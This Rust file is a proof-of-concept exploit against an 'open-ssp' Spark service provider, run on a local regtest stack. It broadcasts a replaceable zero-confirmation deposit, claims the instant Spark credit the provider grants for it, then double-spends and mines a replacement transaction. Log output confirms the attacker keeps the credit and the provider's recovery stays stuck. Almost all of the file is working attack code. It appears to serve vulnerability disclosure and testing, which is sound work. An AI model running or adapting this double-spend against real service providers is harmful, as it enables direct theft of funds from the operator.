//! PoC: theft from an open-ssp SSP via RBF double-spend of an instant static deposit.
//!
//! Runs against the open-ssp native regtest stack (`cargo regtest up`,
//! project "open-ssp-regtest") with the SSP and all three Spark Operators
//! running honest, unmodified code. Only the on-chain behavior is adversarial:
//!
//!   T1 pays the quoted static deposit address, BIP125-signaling, 0-conf.
//!   The SSP credits Spark sats instantly (its checks pass: gettxout finds the
//!   mempool output, ancestorcount == 1). The SSP never checks BIP125
//!   replaceability. T2 then double-spends T1's confirmed input back to the
//!   attacker with a higher fee and is mined; T1 never confirms. The attacker
//!   keeps the Spark credit; the SSP's recovery can never complete.
//!
//! Run with cargo run --manifest-path e2e/breez/Cargo.toml --bin poc_instant_rbf.

use std::{env, path::PathBuf, time::Duration};

use anyhow::{Context, Result, bail, ensure};
use breez_sdk_spark::{
    BreezSdk, ChainApiType, GetInfoRequest, Network, ReceivePaymentMethod, ReceivePaymentRequest,
    SdkBuilder, Seed, SparkConfig, SparkSigningOperator, SparkSspConfig, SyncWalletRequest,
    default_config,
};
use reqwest::Client;
use serde_json::{Value, json};
use tempfile::TempDir;

const OPERATOR_IDENTITIES: [&str; 3] = [
    "0322ca18fc489ae25418a0e768273c2c61cabb823edfb14feb891e9bec62016510",
    "0341727a6c41b168f07eb50865ab8c397a53c7eef628ac1020956b705e43b6cb27",
    "0305ab8d485cc752394de4981f8a5ae004f2becfea6f432c9a59d5022d8764f0a6",
];

const DEPOSIT_SATS: u64 = 2000; // T1 output to the static deposit address
const T1_FEE_SATS: u64 = 500;
const T2_FEE_SATS: u64 = 2000; // higher absolute fee and feerate than T1
const BIP125_SIGNAL: u32 = 0xFFFF_FFFD; // sequence < 0xfffffffe opts in to RBF

struct Config {
    bitcoin_rpc: String,
    bitcoin_user: String,
    bitcoin_password: String,
    ssp_url: String,
    admin_token: String,
    chain_service: String,
    cert_dir: PathBuf,
}

fn optional_env(name: &str, default: &str) -> String {
    env::var(name).unwrap_or_else(|_| default.to_string())
}

impl Config {
    fn from_env() -> Self {
        let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../..")
            .canonicalize()
            .expect("open-ssp repo root");
        Self {
            bitcoin_rpc: optional_env("BITCOIN_RPC_URL", "http://127.0.0.1:8332"),
            bitcoin_user: optional_env("BITCOIN_RPC_USER", "testutil"),
            bitcoin_password: optional_env("BITCOIN_RPC_PASSWORD", "testutilpassword"),
            ssp_url: optional_env("POC_SSP_URL", "http://127.0.0.1:5000"),
            admin_token: optional_env("SPARK_ADMIN_TOKEN", "regtest-spark-admin-token"),
            chain_service: optional_env("BREEZ_CHAIN_SERVICE_URL", "http://127.0.0.1:30000"),
            cert_dir: PathBuf::from(optional_env(
                "POC_CERT_DIR",
                root.join(".regtest/open-ssp-regtest/native/tls")
                    .to_str()
                    .expect("cert path"),
            )),
        }
    }
}

struct Rpc {
    client: Client,
    cfg: Config,
}

impl Rpc {
    async fn call_wallet(&self, wallet: &str, method: &str, params: Value) -> Result<Value> {
        self.raw_wallet(
            wallet,
            method,
            &serde_json::to_string(&params).expect("params serialize"),
        )
        .await
    }

    // Raw-string params: bitcoind rejects exponent notation in amounts, and
    // serde_json prints small BTC values like 7.5e-5. Format amounts as
    // 8-decimal strings inside a hand-built params array instead.
    async fn raw_wallet(&self, wallet: &str, method: &str, params_raw: &str) -> Result<Value> {
        let url = format!(
            "{}/wallet/{}",
            self.cfg.bitcoin_rpc.trim_end_matches('/'),
            wallet
        );
        let body =
            format!(r#"{{"jsonrpc":"1.0","id":"poc","method":"{method}","params":{params_raw}}}"#);
        let response = self
            .client
            .post(&url)
            .basic_auth(&self.cfg.bitcoin_user, Some(&self.cfg.bitcoin_password))
            .header("Content-Type", "application/json")
            .body(body)
            .send()
            .await
            .with_context(|| format!("bitcoind {method} request failed"))?;
        let value: Value = response
            .json()
            .await
            .context("bitcoind returned invalid JSON")?;
        if !value["error"].is_null() {
            bail!("bitcoind {method}: {}", value["error"]);
        }
        Ok(value["result"].clone())
    }

    async fn call(&self, method: &str, params: Value) -> Result<Value> {
        // Node-level calls accept any loaded wallet endpoint.
        self.call_wallet("default", method, params).await
    }
}

fn btc(sats: u64) -> String {
    format!("{}.{:08}", sats / 100_000_000, sats % 100_000_000)
}

fn sats_of(value: &Value) -> Result<u64> {
    let btc = value.as_f64().context("amount is not a number")?;
    Ok((btc * 100_000_000.0).round() as u64)
}

async fn http_json(client: &Client, url: &str, bearer: Option<&str>) -> Result<Value> {
    let mut request = client.get(url).header("Accept", "application/json");
    if let Some(token) = bearer {
        request = request.bearer_auth(token);
    }
    let response = request
        .send()
        .await
        .with_context(|| format!("GET {url} failed"))?;
    let status = response.status();
    let text = response
        .text()
        .await
        .context("could not read HTTP response")?;
    ensure!(status.is_success(), "GET {url}: HTTP {status}: {text}");
    serde_json::from_str(&text).with_context(|| format!("GET {url} did not return JSON"))
}

async fn ssp_status(rpc: &Rpc) -> Result<Value> {
    http_json(
        &rpc.client,
        &format!("{}/status", rpc.cfg.ssp_url),
        Some(&rpc.cfg.admin_token),
    )
    .await
}

async fn wallet_balance(sdk: &BreezSdk) -> Result<u64> {
    sdk.sync_wallet(SyncWalletRequest {}).await?;
    Ok(sdk
        .get_info(GetInfoRequest {
            ensure_synced: Some(false),
        })
        .await?
        .balance_sats)
}

async fn poll<T, F, Fut>(label: &str, timeout: Duration, mut check: F) -> Result<T>
where
    F: FnMut() -> Fut,
    Fut: std::future::Future<Output = Result<T>>,
{
    let start = std::time::Instant::now();
    loop {
        match check().await {
            Ok(value) => return Ok(value),
            Err(error) => {
                if start.elapsed() > timeout {
                    return Err(error.context(format!("{label} timed out")));
                }
                tokio::time::sleep(Duration::from_secs(2)).await;
            }
        }
    }
}

async fn connect_attacker(cfg: &Config, storage: &TempDir) -> Result<BreezSdk> {
    let identity: Value = reqwest::get(format!("{}/identity", cfg.ssp_url))
        .await?
        .error_for_status()?
        .json()
        .await?;
    let ssp_identity = identity["identityPublicKey"]
        .as_str()
        .context("missing SSP identityPublicKey")?
        .to_owned();

    let mut sdk_config = default_config(Network::Regtest);
    sdk_config.api_key = None;
    sdk_config.lnurl_domain = None;
    sdk_config.sync_interval_secs = 2;
    sdk_config.max_deposit_claim_fee = None; // no background deposit claims
    sdk_config.real_time_sync_server_url = None;
    sdk_config.prefer_spark_over_lightning = false;
    sdk_config.use_default_external_input_parsers = false;
    sdk_config.private_enabled_default = true;
    sdk_config.leaf_optimization_config.auto_enabled = false;
    sdk_config.token_optimization_config.auto_enabled = false;

    let current = sdk_config
        .spark_config
        .as_ref()
        .context("Breez regtest config has no Spark configuration")?;
    let mut signing_operators = Vec::with_capacity(3);
    for (id, identity_public_key) in OPERATOR_IDENTITIES.iter().enumerate() {
        let cert_path = cfg.cert_dir.join(format!("server_{id}.crt"));
        let ca_cert_pem = std::fs::read_to_string(&cert_path).with_context(|| {
            format!(
                "could not read {}; run cargo regtest certs",
                cert_path.display()
            )
        })?;
        signing_operators.push(SparkSigningOperator {
            id: id as u32,
            identifier: format!("{:064x}", id + 1),
            address: format!("https://localhost:{}", 8535 + id),
            identity_public_key: (*identity_public_key).to_string(),
            ca_cert_pem: Some(ca_cert_pem),
        });
    }
    sdk_config.spark_config = Some(SparkConfig {
        coordinator_identifier: format!("{:064x}", 1),
        threshold: 2,
        signing_operators,
        ssp_config: SparkSspConfig {
            base_url: cfg.ssp_url.clone(),
            identity_public_key: ssp_identity,
            schema_endpoint: Some("graphql/spark/rc".to_string()),
        },
        expected_withdraw_bond_sats: current.expected_withdraw_bond_sats,
        expected_withdraw_relative_block_locktime: current
            .expected_withdraw_relative_block_locktime,
        max_token_transaction_inputs: None,
    });

    // A fresh identity per run: a stuck instant claim never clears, so reusing
    // an identity trips the SSP's one-pending-claim-per-owner rule on reruns.
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("system clock")
        .as_nanos();
    let seed: Vec<u8> = (0..32u8)
        .map(|i| (nanos >> (((i % 16) as usize) * 8)) as u8 ^ i.wrapping_mul(61))
        .collect();
    let sdk = SdkBuilder::new(sdk_config, Seed::Entropy(seed))
        .with_default_storage(storage.path().to_string_lossy().into_owned())
        .with_rest_chain_service(cfg.chain_service.clone(), ChainApiType::Esplora, None)
        .build()
        .await
        .context("could not connect attacker wallet")?;
    sdk.get_info(GetInfoRequest {
        ensure_synced: Some(true),
    })
    .await
    .context("could not sync attacker wallet")?;
    Ok(sdk)
}

async fn miner(action: &str) -> Result<()> {
    let project = env::var("REGTEST_PROJECT").unwrap_or_else(|_| "open-ssp-regtest".into());
    let status = tokio::process::Command::new("cargo")
        .current_dir(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../.."))
        .args(["regtest", "--project", &project, "miner", action])
        .status()
        .await
        .with_context(|| format!("could not {action} bitcoin-miner"))?;
    ensure!(status.success(), "{action} bitcoin-miner failed");
    Ok(())
}

async fn setup_attacker_wallet(rpc: &Rpc) -> Result<()> {
    let loaded: Vec<String> = serde_json::from_value(rpc.call("listwallets", json!([])).await?)?;
    if !loaded.iter().any(|w| w == "attacker") {
        let dir = rpc.call("listwalletdir", json!([])).await?;
        let exists = dir["wallets"]
            .as_array()
            .is_some_and(|wallets| wallets.iter().any(|w| w["name"] == "attacker"));
        if exists {
            rpc.call("loadwallet", json!(["attacker"])).await?;
        } else {
            rpc.call("createwallet", json!(["attacker"])).await?;
        }
    }
    let unspent = rpc
        .call_wallet("attacker", "listunspent", json!([1, 9_999_999, [], true]))
        .await?;
    if unspent.as_array().map_or(0, |u| u.len()) >= 2 {
        return Ok(()); // already funded from a previous run
    }
    let address = rpc
        .call_wallet("attacker", "getnewaddress", json!(["", "bech32"]))
        .await?;
    let address = address.as_str().context("no attacker address")?;
    for _ in 0..2 {
        rpc.raw_wallet(
            "default",
            "sendtoaddress",
            &format!(r#"["{address}",{}]"#, btc(10_000)),
        )
        .await?;
    }
    let mining = rpc.call("getnewaddress", json!([])).await?;
    rpc.call("generatetoaddress", json!([2, mining])).await?;
    poll(
        "attacker wallet funding",
        Duration::from_secs(120),
        || async {
            let unspent = rpc
                .call_wallet("attacker", "listunspent", json!([1, 9_999_999, [], true]))
                .await?;
            ensure!(
                unspent.as_array().map_or(0, |u| u.len()) >= 2,
                "attacker wallet has no confirmed funding outputs yet"
            );
            Ok(())
        },
    )
    .await
}

async fn take_utxo(rpc: &Rpc, min_sats: u64) -> Result<(String, u32, u64)> {
    let unspent = rpc
        .call_wallet("attacker", "listunspent", json!([1, 9_999_999, [], true]))
        .await?;
    for utxo in unspent.as_array().context("listunspent not an array")? {
        let amount = sats_of(&utxo["amount"])?;
        if amount >= min_sats && utxo["spendable"].as_bool().unwrap_or(false) {
            let txid = utxo["txid"]
                .as_str()
                .context("utxo has no txid")?
                .to_owned();
            let vout = utxo["vout"].as_u64().context("utxo has no vout")? as u32;
            return Ok((txid, vout, amount));
        }
    }
    bail!("attacker wallet has no confirmed utxo of at least {min_sats} sats")
}

/// Build, sign, and return (txid, hex) for a raw transaction spending
/// `input` to `outputs` (address -> sats). Broadcast when `send` is set.
async fn craft_spend(
    rpc: &Rpc,
    input: &(String, u32, u64),
    outputs: &[(String, u64)],
    sequence: u32,
    fee_sats: u64,
    send: bool,
) -> Result<(String, String)> {
    let (txid, vout, value) = input;
    let total: u64 = outputs.iter().map(|(_, s)| s).sum();
    ensure!(
        total + fee_sats <= *value,
        "outputs plus fee exceed the input value"
    );
    let mut outs = outputs.to_vec();
    let change = value - total - fee_sats;
    if change >= 546 {
        let address = rpc
            .call_wallet("attacker", "getnewaddress", json!(["", "bech32"]))
            .await?;
        outs.push((
            address.as_str().context("no change address")?.to_owned(),
            change,
        ));
    }
    let outputs_json = outs
        .iter()
        .map(|(address, sats)| format!(r#"{{"{address}":{}}}"#, btc(*sats)))
        .collect::<Vec<_>>()
        .join(",");
    let raw = rpc
        .raw_wallet(
            "attacker",
            "createrawtransaction",
            &format!(
                r#"[ [{{"txid":"{txid}","vout":{vout},"sequence":{sequence}}}], [{outputs_json}] ]"#
            ),
        )
        .await?;
    let raw = raw
        .as_str()
        .context("createrawtransaction returned no hex")?;
    let signed = rpc
        .raw_wallet(
            "attacker",
            "signrawtransactionwithwallet",
            &format!(r#"["{raw}"]"#),
        )
        .await?;
    ensure!(
        signed["complete"].as_bool() == Some(true),
        "attacker wallet could not sign the transaction: {signed}"
    );
    let hex = signed["hex"]
        .as_str()
        .context("signed transaction has no hex")?;
    let new_txid = if send {
        rpc.raw_wallet("attacker", "sendrawtransaction", &format!(r#"["{hex}"]"#))
            .await?
            .as_str()
            .context("sendrawtransaction returned no txid")?
            .to_owned()
    } else {
        let decoded = rpc.call("decoderawtransaction", json!([hex])).await?;
        decoded["txid"]
            .as_str()
            .context("decoded transaction has no txid")?
            .to_owned()
    };
    Ok((new_txid, hex.to_owned()))
}

#[tokio::main(flavor = "multi_thread")]
async fn main() -> Result<()> {
    let cfg = Config::from_env();
    let rpc = Rpc {
        client: Client::new(),
        cfg,
    };
    let cfg = &rpc.cfg;

    println!("=== PoC: RBF double-spend of an SSP instant static deposit ===");
    println!("SSP: {}  bitcoind: {}", cfg.ssp_url, cfg.bitcoin_rpc);

    // ---- Preconditions: honest, unmodified stack with instant deposits on --
    let status = ssp_status(&rpc).await?;
    ensure!(
        status["ldk_mode"] == "live",
        "SSP does not have a live backend"
    );
    ensure!(
        status["instant_deposits"]["max_outstanding_sats"]
            .as_u64()
            .unwrap_or(0)
            > 0
            && status["instant_deposits"]["max_deposit_sats"]
                .as_u64()
                .unwrap_or(0)
                >= DEPOSIT_SATS,
        "instant deposits are disabled; start the stack with \
         SSP_INSTANT_MAX_OUTSTANDING_SATS=100000 SSP_INSTANT_MAX_DEPOSIT_SATS=10000"
    );
    let ssp_before = status["spark"]["available_sats"]
        .as_u64()
        .context("SSP status has no available Spark balance")?;
    println!(
        "[setup] SSP available Spark liquidity: {ssp_before} sats; instant config: {}",
        status["instant_deposits"]
    );

    // ---- Step 1: attacker controls confirmed utxos -------------------------
    setup_attacker_wallet(&rpc).await?;
    let funding = take_utxo(&rpc, DEPOSIT_SATS + T1_FEE_SATS + 1000).await?;
    println!(
        "[step 1] attacker confirmed utxo: {}:{} ({} sats)",
        funding.0, funding.1, funding.2
    );

    // Deterministic timing: no block may confirm T1 before the double-spend.
    miner("stop").await?;
    println!("[setup] stopped the auto-miner for deterministic timing");

    // ---- Step 2: static deposit address from the SSP flow ------------------
    let storage = tempfile::Builder::new().prefix("poc-attacker-").tempdir()?;
    let sdk = connect_attacker(cfg, &storage).await?;
    let balance_before = wallet_balance(&sdk).await?;
    let deposit_address = sdk
        .receive_payment(ReceivePaymentRequest {
            payment_method: ReceivePaymentMethod::BitcoinAddress {
                new_address: Some(false),
            },
        })
        .await?
        .payment_request;
    println!(
        "[step 2] attacker Spark identity ready (balance {balance_before} sats); \
         static deposit address: {deposit_address}"
    );

    // ---- Step 3: broadcast T1, BIP125-signaling, to the deposit address ----
    let (t1_txid, t1_hex) = craft_spend(
        &rpc,
        &funding,
        &[(deposit_address.clone(), DEPOSIT_SATS)],
        BIP125_SIGNAL,
        T1_FEE_SATS,
        true,
    )
    .await?;
    let t1 = rpc
        .call("getrawtransaction", json!([t1_txid, true]))
        .await?;
    let t1_vout = t1["vout"]
        .as_array()
        .context("T1 outputs missing")?
        .iter()
        .find(|v| v["scriptPubKey"]["address"] == deposit_address)
        .context("T1 deposit output missing")?["n"]
        .as_u64()
        .context("T1 deposit output has no index")? as u32;
    let coin = rpc
        .call("gettxout", json!([t1_txid, t1_vout, true]))
        .await?;
    ensure!(!coin.is_null(), "T1 output is not visible in the mempool");
    let entry = rpc.call("getmempoolentry", json!([t1_txid])).await?;
    println!(
        "[step 3] T1 {t1_txid}:{t1_vout} broadcast, 0-conf; \
         getmempoolentry ancestorcount={} bip125-replaceable={}",
        entry["ancestorcount"], entry["bip125-replaceable"]
    );
    ensure!(
        entry["ancestorcount"].as_u64() == Some(1),
        "T1 must spend confirmed inputs"
    );
    let replaceable = entry["bip125-replaceable"].as_bool() == Some(true)
        || entry["bip125-replaceable"].as_str() == Some("yes");
    ensure!(replaceable, "T1 does not signal BIP125 replaceability");

    // ---- Step 4: quote + claim; the SSP credits instantly ------------------
    let quote = sdk.get_instant_deposit_quote(&t1_hex, t1_vout).await?;
    let credit = quote.quote.credit_amount.original_value;
    let plan = quote
        .fulfillment_plans
        .first()
        .cloned()
        .context("quote has no fulfillment plan")?;
    println!(
        "[step 4] EVIDENCE: SSP quoted instant credit of {credit} sats \
         (deposit {DEPOSIT_SATS}, plan confirmations={}) for the 0-conf replaceable T1",
        plan.confirmations
    );
    let claim_id = sdk
        .claim_instant_deposit(&t1_hex, quote.quote.clone(), plan)
        .await?;
    poll("instant Spark credit", Duration::from_secs(90), || async {
        let balance = wallet_balance(&sdk).await?;
        ensure!(
            balance == balance_before + credit,
            "credit not settled: balance {balance}, want {}",
            balance_before + credit
        );
        Ok(balance)
    })
    .await?;
    let status = ssp_status(&rpc).await?;
    let ssp_after_credit = status["spark"]["available_sats"].as_u64().unwrap_or(0);
    println!(
        "[step 4] EVIDENCE: claim {claim_id} accepted; attacker Spark balance \
         {balance_before} -> {} sats; SSP available liquidity {ssp_before} -> {ssp_after_credit} sats",
        balance_before + credit
    );

    // ---- Step 5: double-spend T1's input with T2 and mine it ---------------
    let attacker_return = rpc
        .call_wallet("attacker", "getnewaddress", json!(["", "bech32"]))
        .await?;
    let attacker_return = attacker_return
        .as_str()
        .context("no return address")?
        .to_owned();
    let (t2_txid, _) = craft_spend(
        &rpc,
        &funding,
        &[(attacker_return.clone(), funding.2 - T2_FEE_SATS)],
        BIP125_SIGNAL,
        T2_FEE_SATS,
        true,
    )
    .await?;
    let mining = rpc.call("getnewaddress", json!([])).await?;
    rpc.call("generatetoaddress", json!([1, mining])).await?;
    let coin = rpc
        .call("gettxout", json!([t1_txid, t1_vout, true]))
        .await?;
    ensure!(
        coin.is_null(),
        "T1 output still exists after the double-spend"
    );
    let t1_tx = rpc
        .call_wallet("attacker", "gettransaction", json!([t1_txid]))
        .await?;
    let t2_conf = rpc
        .call_wallet("attacker", "gettransaction", json!([t2_txid]))
        .await?;
    println!(
        "[step 5] EVIDENCE: T2 {t2_txid} mined (confirmations={}); T1 evicted: \
         gettxout=null, wallet confirmations={} (conflicted)",
        t2_conf["confirmations"], t1_tx["confirmations"]
    );

    // ---- Step 6a: the stolen credit remains --------------------------------
    miner("start").await?;
    println!("[setup] restarted the auto-miner");
    rpc.call("generatetoaddress", json!([2, mining])).await?;
    tokio::time::sleep(Duration::from_secs(15)).await; // let the SSP worker cycle
    let balance_after = wallet_balance(&sdk).await?;
    ensure!(
        balance_after == balance_before + credit,
        "attacker credit changed after the double-spend: {balance_after}"
    );
    println!(
        "[step 6a] EVIDENCE: after T1 was double-spent out of the chain, the \
         attacker keeps {balance_after} sats of Spark credit (stolen: {credit} sats)"
    );

    // ---- Step 6b: the SSP's recovery is permanently stuck ------------------
    let status = ssp_status(&rpc).await?;
    let outstanding = status["instant_deposits"]["outstanding_sats"]
        .as_u64()
        .unwrap_or(0);
    let settlements = http_json(
        &rpc.client,
        &format!("{}/admin/settlements", cfg.ssp_url),
        Some(&cfg.admin_token),
    )
    .await?;
    let record = sdk.service_provider().get_request_record(&claim_id).await?;
    let record_json = serde_json::to_string(&record).unwrap_or_default();
    println!(
        "[step 6b] EVIDENCE: SSP instant_deposits.outstanding_sats={outstanding}; \
         the SSP will hold this exposure forever because T1 does not exist"
    );
    println!(
        "[step 6b] EVIDENCE: SSP /admin/settlements unresolved instant claim: {}",
        serde_json::to_string_pretty(&settlements["unresolved"])?
    );
    println!(
        "[step 6b] EVIDENCE: user-facing request record still reports the payout: {record_json}"
    );
    ensure!(
        outstanding >= credit,
        "unexpected outstanding exposure {outstanding}"
    );
    let stuck = settlements["unresolved"].as_array().is_some_and(|rows| {
        rows.iter()
            .any(|r| r["kind"] == "INSTANT_STATIC_DEPOSIT" && r["state"] == "TRANSFER_COMPLETED")
    });
    ensure!(stuck, "no stuck INSTANT_STATIC_DEPOSIT settlement found");

    // ---- Step 7: negative control; a fabricated txid is rejected ------------
    let funding2 = take_utxo(&rpc, DEPOSIT_SATS + T1_FEE_SATS + 1000).await?;
    let (_t3_txid, t3_hex) = craft_spend(
        &rpc,
        &funding2,
        &[(deposit_address.clone(), DEPOSIT_SATS)],
        BIP125_SIGNAL,
        T1_FEE_SATS,
        false, // signed but never broadcast: gettxout must return null
    )
    .await?;
    match sdk.get_instant_deposit_quote(&t3_hex, 0).await {
        Err(error) => println!(
            "[step 7] EVIDENCE: fabricated (never broadcast) deposit rejected at quote time: {error}"
        ),
        Ok(_) => bail!("SSP quoted a deposit that does not exist on-chain or in the mempool"),
    }

    println!();
    println!("=== RESULT: EXPLOIT CONFIRMED ===");
    println!("The SSP advanced {credit} sats of Spark credit against a BIP125-signaling");
    println!("0-conf deposit that was double-spent before ever confirming. The attacker");
    println!("keeps the credit; the SSP's recovery is stuck in TRANSFER_COMPLETED and its");
    println!("outstanding exposure never clears. The SSP lost {credit} sats.");
    Ok(())
}
